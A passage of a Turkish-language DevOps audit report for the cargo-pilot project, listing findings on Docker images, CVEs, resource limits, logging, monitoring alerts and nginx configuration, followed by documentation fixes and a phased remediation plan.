2. `alpine` varyantı **njs** modülünü içerir; njs `libxml2` + `libxslt` getirir.
   known-issues #8'de frontend CRITICAL'ları arasında sayılan **`libxml2` tam olarak buradan geliyor.**
   `alpine-slim`'de njs yok → o CVE'ler **paket ortadan kalktığı için** kapanır

`apps/frontend/nginx.conf` yalnızca core modül kullanıyor — `alpine-slim` sorunsuz.
**Kazanç: ~−36 MB + libxml2/libxslt CVE sınıfının komple düşmesi.**

### D-32 · Base image mirror'ı bayat 📄 · Yüksek

known-issues #8'deki `System.Security.Cryptography.Xml (.NET 8.0.2 → 8.0.3)` bulgusu önemli bir sinyal:
bu paket hiçbir `.csproj`'da referanslı **değil** — ASP.NET Core shared framework'ünün parçası.
Yani Trivy bunu **base image'ın runtime'ından** okumuş.

En son .NET 8 patch'i **8.0.29** (14 Temmuz 2026). Mirror bayat.

**Aksiyon:** `sync-base-images.yml`'i manuel tetikle → Trivy'yi tekrar koş → CVE tablosunun
gerçek durumunu gör. **Dockerfile değişikliği bile gerekmeyebilir.**

> **Stratejik:** .NET 8, **10 Kasım 2026**'da destek dışına çıkıyor — ~3 ay kaldı.
> O tarihten sonra hiçbir base image güncellemesi CVE kapatmayacak. .NET 10 LTS geçiş planı
> backlog'a girmeli.

### D-33 · `sync-base-images.yml` verimsiz 📄 · Orta

`docker pull` + `tag` + `push` tüm layer'ları runner'a indirip tekrar yüklüyor. Ayrıca
runner'ın platformunu (amd64) çektiği için **multi-arch manifest kayboluyor.**

```yaml
docker buildx imagetools create \
  --tag ghcr.io/divizyon/cargo-pilot-dotnet-$img:8.0 \
  mcr.microsoft.com/dotnet/$img:8.0
```

Layer'lar hiç runner'a inmez, manifest list korunur. **Kazanç ~2-4 dk/hafta.**

Ayrıca tazelik penceresi: Microsoft patch'leri ayın 2. Salı'sı yayınlıyor, sync Pazar koşuyor →
**5 güne kadar bayat.** `imagetools create` ile maliyet düşünce günlük koşmak bedava.

### D-34 · `npm install` → `npm ci` 📄 · Orta

`apps/frontend/Dockerfile:5`. `package-lock.json` mevcut ama `npm install` lock'u yazabilir →
image içindeki bağımlılıklar CI'daki `npm ci` sonucundan sapabilir.

### D-35 · Docker build'de statik analiz koşuyor 📄 · Orta

`Directory.Build.props:24,30` — `EnforceCodeStyleInBuild`, `TreatWarningsAsErrors` + SonarAnalyzer.
Kalite kapısı **zaten** `ci.yml`'daki `backend-ci`'de uygulanıyor; Docker build'de tekrarı saf tekrar.
SonarAnalyzer tipik olarak derlemeyi %30–60 uzatır.

⚠️ **Risk orta:** `test-deploy.yml`'ın build job'unda `needs: [backend-ci]` **yok**, yani
`test` push'unda analyzer hiç koşmaz. Kabul ediliyorsa uygulanabilir.

### D-36 · Tek parça 3.35 MB JS chunk 📄 · Orta (frontend task'ı)

`src/router.tsx` içinde **sıfır** `lazy()` — three.js + drei + recharts + xlsx + framer-motion +
gsap + 37 sayfa tek chunk'ta. Landing sayfasını açan kullanıcı three.js'i de indiriyor.

(`react-pdf` doğru yapılmış: `exportPlanToPdf.ts:22` dinamik import kullanıyor.)

Image boyutundan çok **ilk yükleme süresini** etkiliyor → ayrı bir frontend task'ı olmalı,
Docker task'ına karıştırılmamalı.

### D-37 · `.dockerignore` boşlukları 📄 · Düşük

Build context'ler ölçüldü: backend **4.8 MB** (sorun yok), frontend **44 MB** (41 MB'ı D-08).
`.git` hiçbir context'e girmiyor. D-08 çözülünce frontend context'i ~3 MB olur.

Küçük eklemeler: backend'e `docs/`, `.github/`; frontend'e `.claude`, `coverage`, `**/*.test.tsx`.
Değeri boyut değil, `COPY . .` katmanının test dosyası değişikliğinde invalidate olmaması.

---

## 7. Altyapı ve Gözlemlenebilirlik

### D-38 · Hiçbir serviste kaynak limiti yok 📄 · **Kritik**

16 servisin hiçbirinde `deploy.resources`, `mem_limit`, `cpus`, `pids_limit` yok.
Tek bir kaçak servis sunucunun tamamını götürür; OOM killer önceliksiz seçim yapar.

### D-39 · `MSSQL_MEMORY_LIMIT_MB` tanımlı değil 📄 · **Kritik**

SQL Server on Linux varsayılanı ≈ host RAM'inin **%80'i**. `mem_limit` de olmadığı için
container görünürlüğü host RAM'i.

`server-requirements.md:43`'teki **"MSSQL × 2 ≈ 4 GB" varsayımı yanlış** — kapasite analizi
bu varsayıma dayanıyor. Prod aynı sunucuya kurulursa iki instance da host'un %80'ini hedefler → OOM.

```yaml
  mssql:
    environment:
      MSSQL_MEMORY_LIMIT_MB: 4096   # test: 2048
    mem_limit: 5g                    # test: 3g
    cpus: 2.0
```

### D-40 · Log rotation hiçbir serviste yok 📄 · Yüksek · *kayıtlı ama kapsamı yanlış*

known-issues #7 "diğer container'larda `max-size: 100m` tanımlı" diyor. Repo'da **hiçbir**
`logging:` bloğu yok ve `git log -S "max-size" -- infra/` hiç commit döndürmüyor —
**bu ifade hatalı.** 16 servisin tamamı etkileniyor.

⚠️ **Doğrulanmadı:** Sunucuda `/etc/docker/daemon.json` ile global rotation kurulmuş olabilir.
**Önce bu bakılmalı.** Kurulmadıysa 2026-05-16'daki 960 MB Loki olayı backend/mssql/minio için de tekrar edebilir.

### D-41 · Grafana SMTP hiç yapılandırılmamış 📄 · Yüksek · *backlog 2.4'ün yerini alır*

Contact point dosyaları **mevcut** (`contact-points.yml`, email → devops@divizyon.org) ve
notification policy'ler tanımlı. Eksik olan Grafana'nın SMTP yapılandırması — `GF_SMTP_*`
hiçbir yerde geçmiyor. SMTP olmadan e-posta receiver'ı **sessizce hiçbir şey göndermez.**

`devops-backlog.md` 2.4 ve `monitoring-setup.md:164` "contact point oluşturulmalı" diyor —
**yanlış teşhis, madde güncellenmeli.**

⚠️ Resend domain doğrulaması tamamlanmadığı sürece (known-issues #1) e-posta yolu kırık kalır.
**Slack/Discord webhook contact point'i daha güvenli seçim** — SMTP gerektirmez.

### D-42 · Prod monitoring, test alert kurallarını da yüklüyor 📄 · Yüksek

`docker-compose.monitoring.prod.yml:83` alerting dizininin **tamamını** mount ediyor.
Dizinde hem prod hem test dosyaları var → prod Grafana `prometheus-test` UID'lerine bakan
6 test kuralını da yükler (kalıcı `DatasourceError`), contact point'ler UID çakışır.

**Düzeltme:** test dosyasındaki tek-tek mount kalıbına geç.

### D-43 · Eksik alert kuralları 📄 · Orta

Mevcut 6 kural: 5xx, error log, backend up, CPU>75, RAM>80, Disk>80. Eksikler:

- **MSSQL / MinIO container down** — uygulamanın en kritik iki bağımlılığı için alert yok
- Disk %90+ critical eşiği (tek eşik %80 warning)
- Yedek başarısızlığı (D-20)
- Monitoring'in kendi sağlığı (Loki/Prometheus down → yalnızca `DatasourceNoData`)
- SSL sertifika bitiş tarihi

`monitoring-setup.md:157-161` yalnızca 3 kural listeliyor — dosyada 6 var, doküman bayat.

### D-44 · Prometheus/Loki retention ve limitler 📄 · Orta

- Prometheus: yalnızca zaman bazlı retention (30d), **boyut tavanı yok** →
  `--storage.tsdb.retention.size=8GB` eklenmeli
- Prometheus kendini, Grafana'yı, Loki'yi ve MinIO'yu scrape etmiyor → monitoring stack kör nokta
- Loki `limits_config`'te ingestion rate limit yok → log patlaması Loki'yi doldurabilir
- Loki compactor'da `retention_delete_delay` tanımsız — 2026-05-16'da diskin dolması
  retention'ın fiilen işlemediğine işaret edebilir ⚠️ doğrulanmadı

### D-45 · Promtail sadece 2 container'ı topluyor 📄 · Orta

Scrape filtresi yalnızca `cargo-pilot-backend-*` ve `cargo-pilot-frontend-*`.
**MSSQL, MinIO ve monitoring logları hiç toplanmıyor** — bir DB olayında Grafana'da hiçbir iz olmaz.

Ayrıca `positions.filename: /tmp/positions.yaml` container içinde, volume yok →
her restart'ta pozisyon kaybı → log tekrarı veya kayıp.

### D-46 · Nginx eksikleri 📄 · Yüksek

| Bulgu | Risk |
|-------|------|
| `/api/` altında `client_max_body_size` yok → nginx default **1 MB**; Excel/ERP import 413 alır | Yüksek |
| Rate limiting yok — login/şifre sıfırlama brute-force'a açık | Yüksek |
| HSTS yok | Yüksek |
| CSP, Referrer-Policy, Permissions-Policy yok | Orta |
| `/media/` bloğundaki `add_header`, üst seviyedeki `X-Frame-Options`'ı iptal ediyor (nginx kalıtım kuralı) | Orta |
| `proxy_read_timeout 60s`; uzun optimizasyon istekleri 504 | Orta |
| gzip/brotli yok — 3.35 MB JS sıkıştırılmadan gidiyor (gzip'li 990 KB) | Orta |
| `server_tokens off` yok, IPv6 listen yok | Düşük |
| Cloudflare IP listesi elle yazılmış (IPv6 yok, bayatlama riski) | Düşük |

### D-47 · Prod nginx conf'u yok ve setup script'i sabit test conf'u kopyalıyor 📄 · Yüksek

`infra/nginx/` yalnızca `cargopilot-test.conf` içeriyor. `setup-nginx.sh:12` sabit olarak onu kopyalıyor.
**Prod sunucusunda çalıştırılırsa prod domain'i test container'larına proxy eder.**

**Düzeltme:** script ortam parametresi alsın (`bash setup-nginx.sh prod`).

### D-48 · `setup-nginx.sh` canlı config'i test etmeden üzerine yazıyor 📄 · Orta

`:52` `cp` canlı config'in üzerine yazıyor, `nginx -t` (`:65`) **sonra** çalışıyor.
Repodaki config bozuksa: script `nginx -t`'de ölür, bozuk config yerinde kalır, sonraki herhangi
bir reload/reboot **nginx'i tamamen düşürür.**

Ayrıca `:72` — `ufw status | grep 443`, UFW pasifse `set -e` altında **exit 1** →
`systemctl restart nginx` adımına hiç gelinmez.

### D-49 · Frontend healthcheck'i yok, monitoring servislerinde hiç yok 📄 · Orta

`restart: unless-stopped` 16 servisin hepsinde var ✔. Healthcheck backend/mssql/minio'da var,
**frontend'de yok**, monitoring'in 6 servisinin hiçbirinde yok.

Grafana `depends_on: [prometheus, loki]` koşulsuz → Loki hazır olmadan datasource provisioning
yapıp 503 alabilir (2026-05-16 olayının tetikleyicilerinden biri olabilir ⚠️ doğrulanmadı).

### D-50 · `.env.prod.example` port ve path uyumsuzlukları 📄 · Yüksek

- `FRONTEND_PORT=80` — nginx host'ta 80/443 dinliyor. Prod stack aynı sunucuda kalkarsa
  **port çakışması** ya da TLS'i baypas eden düz HTTP servis
- `MINIO_PUBLIC_ENDPOINT=.../files` ama nginx'te tanımlı path `/media/` → tüm dosya linkleri 404

### D-51 · Ölü konfigürasyon dosyaları 📄 · Düşük

`infra/docker/minio/config/init-bucket.sh` ve `infra/docker/mssql/init/init.sql` hiçbir compose'da
mount edilmiyor (bucket ve policy'yi backend `MinioStorageService` kendisi kuruyor). Silinebilir.

---

## 8. Doküman Düzeltmeleri

Ucuz ama olay anında yanlış yere baktırdıkları için önemli.

| Dosya | Sorun |
|-------|-------|
| `known-issues.md:144` | "Diğer container'larda log rotation tanımlı" — **hatalı**, hiçbirinde yok |
| `devops-backlog.md:132` + `monitoring-setup.md:164` | "Contact point yok" — **var**; gerçek eksik SMTP |
| `devops-backlog.md` 1.2/1.3/1.4 | PR #908 ile kapandı, ✅'e çekilmeli |
| `monitoring-setup.md:157-161` | 3 kural yazıyor, dosyada 6 var |
| `server-requirements.md:43` | "MSSQL × 2 ≈ 4 GB" varsayımı D-39 ile çelişiyor |
| `secret-management.md:107-114` | `TEST_GHCR_*`'ı aktif secret olarak listeliyor — ölü |
| `server-access.md` | `SSH_HOST`/`SSH_PRIVATE_KEY` diyor; gerçek adlar `TEST_SSH_*` |
| — | Rollback runbook'u **yok** (D-24) |

---

## 9. Önerilen Uygulama Sırası

### Dalga 0 — Önce sunucuya bak (15 dk)

Uygulamaya geçmeden şunlar teyit edilmeli:

```bash
cat /etc/docker/daemon.json          # D-40 — global log rotation var mı?
free -h && df -h                     # D-38/D-39 — gerçek RAM ve disk
crontab -l                           # D-01/D-21 — cron'lar ne durumda
ls -la /opt/cargo-pilot/infra/scripts/   # D-01 — mevcut izinler
ls -la /opt/cargo-pilot/backups/mssql/test/   # yedekler gerçekten alınıyor mu
grep -c . /opt/cargo-pilot/infra/env/.env.test   # D-15 — fallback değerler kullanılmış mı
```

### Dalga 1 — Ucuz ve kritik (~1 gün)

| # | İş | Neden önce |
|---|---|---|
| D-01 | Script exec bitleri + cron'da `bash` öneki | 42 günlük olayın kök nedeni, 15 dk |
| D-02 | Portları `127.0.0.1`'e bağla (+ CI health check'i taşı) | Açık kapı |
| D-07 | Ölü secret'ları sil, PAT'i iptal et | INC-003 sınıfı |
| D-06 | Default branch cache seed job'u | CI süresinin kökü |
| D-22, D-23 | Ölü hata blokları, yedek dosya izinleri | Dakikalar |
| D-25 | Rollback'te yedek zorunlu hale gelsin | Tek satır |
| Doküman | §8'deki tüm düzeltmeler | Ucuz, olay anında kritik |

### Dalga 2 — Veri kaybı riski (~2 gün)

D-03 (MinIO yedeği) · D-04 (off-site) · D-18 (ERP DB) · D-19 (CHECKSUM + restore tatbikatı) ·
D-20 (yedek metriği + alert) · D-21 (prod cron'larını kaldır) · D-41 (bildirim kanalı — D-20'nin ön koşulu)

### Dalga 3 — CI/CD süresi (~1 gün)

D-09 (`docker-build` kaldır) · D-12 (`needs` kaldır) · D-10 (`deploy` → `needs: [build]`) ·
D-11 (test push'ta geçici stack'i kapat) · D-13 (küçük kalemler)

**Beklenen:** seri bekleme 19.8 → ~10.8 dk, compute 31.4 → ~22 dk.

### Dalga 4 — Rollback ve deploy güvenliği (~2 gün)

D-05 (etiket şeması) · D-26 (`down` kaldır → kesinti 3 dk → 20 sn) · D-27 (otomatik geri alma) ·
D-28 (prune sırası) · D-14 (injection) · D-24 (runbook) · D-29 (**tatbikat**)

### Dalga 5 — Image ve CVE (~1 gün)

D-32 (base image tazele + Trivy) · D-31 (`alpine-slim`) · D-08 (texture) · D-30 (restore katmanı) ·
D-33 (`imagetools`) · D-34 (`npm ci`) · D-37 (`.dockerignore`)

### Dalga 6 — Altyapı sertleştirme (~2 gün)

D-38/D-39 (kaynak limitleri) · D-40 (log rotation) · D-42 (prod alerting mount) ·
D-43/D-44/D-45 (alert + retention + promtail) · D-46/D-47/D-48 (nginx) · D-49 (healthcheck) ·
D-50 (prod port/path) · D-17 (non-root MSSQL) · D-51 (ölü config)

### Prod sunucusu kurulmadan önce zorunlu

**D-38, D-39, D-47, D-50** — bunlar olmadan prod stack kalkarsa ya çakışır ya OOM olur.

---

## 10. Bu Analizin Kapsamadıkları

- **Sunucunun fiili durumu** — SSH atılmadı (bkz. Dalga 0)
- **Image boyutları** — Docker CLI yok; backend ~260–285 MB **tahmin**
- **Build süreleri** — CI job süreleri ölçüldü, Dockerfile katman süreleri tahmin
- **GHCR image tag listesi** — `read:packages` scope'u yok, 403
- **Prod stack davranışı** — hiç ayağa kaldırılmadı
- **Uygulama kodu, testler, frontend performansı** — kapsam dışı (D-36 istisna, işaret amaçlı)
- **Maliyet/faturalama** — GitHub Actions dakika tüketimi ve GHCR depolama maliyeti incelenmedi

---

**Toplam tahmini efor:** ~9 gün (dalga 0 hariç).
**Uygulama sırası kararı ekibe aittir**; yukarıdaki sıralama risk × maliyet önceliğidir.
